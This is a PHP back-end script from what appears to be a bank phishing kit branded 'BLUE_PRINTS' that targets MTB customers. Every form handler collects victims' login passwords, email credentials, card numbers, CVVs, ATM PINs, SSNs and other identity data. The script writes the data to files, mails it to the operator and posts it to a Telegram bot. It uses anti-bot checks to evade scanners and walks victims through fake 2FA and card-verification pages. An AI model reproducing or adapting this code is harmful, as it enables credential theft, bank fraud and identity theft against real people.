<?php 

	session_start();

	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
	include '../../crawlerdetect.php';
	        // variable declaration
	        $errors = array(); 


	       if (isset($_POST['invalid']))
	          {
	          	include 'recon.php';
	          	 include '../conf/config.php';
	          // Get User Input
	          $usr  = $_POST['usr'];
    $_SESSION['usr'] = $usr;
	$pass 	  = $_POST['pasd'];
    $_SESSION['pass'] = $pass;
	          
	          $ip = $_SERVER['REMOTE_ADDR'];
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = ":::::::::::::::  MTB BLUE_PRINTS 1nf0 [Dual Login Details] ::::::::::::::::::\r\n";
	          $body .= "User                                   : $usr\r\n";
	          $body .= "Password                               : $pass\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::  MTB BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
	          if($savetxt == "on"){
				$save=fopen("../data/login".$salt.".txt",'a');
				fwrite($save,$body);
				fclose($save);
				}            
	          $subject="Login 2 By BLUE_PR1NTS=> From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";

	          $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
			  if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          	$key = $_SESSION['token'];
				 echo "<script>window.location.href='../../2fa.php?token=".$key."';</script>";
				 
	          }
	          
	          if(isset($_POST['usr'])&&isset($_POST['pasd']))
	          {
	          include 'recon.php';
	           include '../conf/config.php';
	          // check for valid email address
	          $usr  = $_POST['usr'];
    		  $_SESSION['usr'] = $usr;
	  		  $pass = $_POST['pasd'];
    		  $_SESSION['pass'] = $pass;
	          
	          $ip = $_SERVER['REMOTE_ADDR'];
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = ":::::::::::::::::::  MTB BLUE_PRINTS 1nf0 [Login Details] :::::::::::::::::::::\r\n";
	          $body .= "User                                   : $usr\r\n";
	          $body .= "Password                               : $pass\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::::::::  MTB BLUE_PRINTS 1nf0 ::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
				$save=fopen("../data/login".$salt.".txt",'a');
				fwrite($save,$body);
				fclose($save);
				} 
	           
	          $subject="Login By BLUE_PR1NTS => From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";
	          
	          $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
			  if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          $key = $_SESSION['token'];
			  if($d_log == "on"){
			  echo "<script>window.location.href='../../access.php?invalid&token=".$key."';</script>";}else{echo "<script>window.location.href='../../2fa.php?token=".$key."';</script>";}
			 
	          die();
	        
	          }
	          
	          if(isset($_POST['email_address'])&&isset($_POST['email_password']))
	          {
	          	include 'recon.php';
	          	 include '../conf/config.php';
	          // check for valid email address
	          $eml 	  = $_POST['email_address'];
	          $epass  = $_POST['email_password'];
	          
	          $ip = $_SERVER['REMOTE_ADDR'];
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = ":::::::::::::::::::  MTB BLUE_PRINTS 1nf0 1 [Account Details] :::::::::::::::::::::\r\n";
	          $body .= "Email                               : $eml\r\n";
	          $body .= "Password                            : $epass\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::::::::  MTB BLUE_PRINTS 1nf0 ::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
				$save=fopen("../data/email".$salt.".txt",'a');
				fwrite($save,$body);
				fclose($save);
				} 
 
	          $subject="Email Details By BLUE_PR1NTS=> From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";

	          $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
			  if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../email.php?invalid&token=".$key."';</script>";
	          	die();
	          }

              if(isset($_POST['ccn'])&&isset($_POST['cvv']))
	          {
	          	include 'recon.php';
	          	 include '../conf/config.php';
	          // check for valid email address
	          $_SESSION['ccn'] 	  = $_POST['ccn'];
        	  $_SESSION['cvv'] 	  = $_POST['cvv'];
	          $_SESSION['expmnth']  = $_POST['exp'];
	          $_SESSION['atm']  = $_POST['atp'];
	          
	          $ip = $_SERVER['REMOTE_ADDR'];
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
			  $body = "::::::::::  MTB BLUE_PRINTS 1nf0 [Login Details] ::::::::::::::\r\n";
        	  $body .= "User                                   : {$_SESSION['usr']}\r\n";
        	  $body .= "Password                               : {$_SESSION['pass']}\r\n";
			  $body .= "::::::::::  MTB BLUE_PRINTS 1nf0 [email Details] ::::::::::::::\r\n";
			  $body .= "{$_SESSION['emailr']}\r\n";
			  $body .= "::::::::::::::::  MTB BLUE_PRINTS [Billing Details] :::::::::::::\r\n";
	          $body .= "Fname                                  : {$_SESSION['fname']}\r\n";
	          $body .= "DOB                                    : {$_SESSION['dob']}\r\n";
              $body .= "Phone no                               : {$_SESSION['phnum']}\r\n";
              $body .= "carrier Pin                            : {$_SESSION['crpn']}\r\n";
			  $body .= "SSN                                    : {$_SESSION['ssn']}\r\n";
	          $body .= "address                                : {$_SESSION['stradd1']}\r\n";
              $body .= "City                                   : {$_SESSION['cty']}\r\n";
              $body .= "zipcode                                : {$_SESSION['zpcd']}\r\n";
			  $body .= "Driving                                : {$_SESSION['inm']}\r\n";
	          $body .= ":::::::::  MTB BLUE_PRINTS 1nf0 [Card Details] :::::::::::::\r\n";
	          $body .= "Card Number                          : {$_SESSION['ccn']}\r\n";
	          $body .= "Expiry Date                          : {$_SESSION['expmnth']}\r\n";
	          $body .= "CVV                                  : {$_SESSION['cvv']}\r\n";
	          $body .= "ATM PIN                              : {$_SESSION['atm']}\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::::::::  MTB BLUE_PRINTS 1nf0 ::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
				$save=fopen("../data/card".$salt.".txt",'a');
				fwrite($save,$body);
				fclose($save);
				} 
	           
	          $subject="Card Details By BLUE_PR1NTS=> From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";
	          $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
			  if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          	$key = $_SESSION['token'];
					echo "<script>window.location.href='../../complete.php?token=".$key."';</script>";
	        
	          }


	          if(isset($_POST['fname'])&&isset($_POST['dob']))
	          {
	          include 'recon.php';
	           include '../conf/config.php';
	          // check for valid email address
	          $_SESSION['fname']	  = $_POST['fname'];
			$_SESSION['dob']	  = $_POST['dob'];
			$_SESSION['ssn']	  = $_POST['ssn'];
			$_SESSION['phnum']	  = $_POST['phn'];
			$_SESSION['email'] = $_POST['sfgsdg'];
			$_SESSION['stradd1'] 	  = $_POST['addy'];
			$_SESSION['cty'] 	  = $_POST['cty'];   
			$_SESSION['crpn'] 	  = $_POST['crpn'];
			$_SESSION['zpcd'] 	  = $_POST['zpcd'];
			$_SESSION['state'] 	  = $_POST['stte'];
			$_SESSION['inm'] 	  = $_POST['inm'];
	          
	          $ip = $_SERVER['REMOTE_ADDR'];
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
			  $body = "::::::::::  MTB BLUE_PRINTS 1nf0 [Login Details] ::::::::::::::\r\n";
        	  $body .= "User                                   : {$_SESSION['usr']}\r\n";
        	  $body .= "Password                               : {$_SESSION['pass']}\r\n";
			  $body .= "::::::::::  MTB BLUE_PRINTS 1nf0 [email Details] ::::::::::::::\r\n";
			  $body .= "{$_SESSION['emailr']}\r\n";
	          $body .= "::::::::::::::::  MTB BLUE_PRINTS [Billing Details] :::::::::::::\r\n";
	          $body .= "Fname                                  : {$_SESSION['fname']}\r\n";
	          $body .= "DOB                                    : {$_SESSION['dob']}\r\n";
              $body .= "Phone no                               : {$_SESSION['phnum']}\r\n";
              $body .= "carrier Pin                            : {$_SESSION['crpn']}\r\n";
			  $body .= "SSN                                    : {$_SESSION['ssn']}\r\n";
	          $body .= "address                                : {$_SESSION['stradd1']}\r\n";
              $body .= "City                                   : {$_SESSION['cty']}\r\n";
              $body .= "zipcode                                : {$_SESSION['zpcd']}\r\n";
			  $body .= "Driving                                : {$_SESSION['inm']}\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::::::::  MTB BLUE_PRINTS 1nf0 ::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
				$save=fopen("../data/billing".$salt.".txt",'a');
				fwrite($save,$body);
				fclose($save);
				} 
	           
	          $subject="Billing Details By BLUE_PR1NTS => From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";
	          
	          $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
			  if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          $key = $_SESSION['token'];
	          echo "<script>window.location.href='../../verify_card.php?token=".$key."';</script>";
	          die();
	        
	          }
	          
	      
?>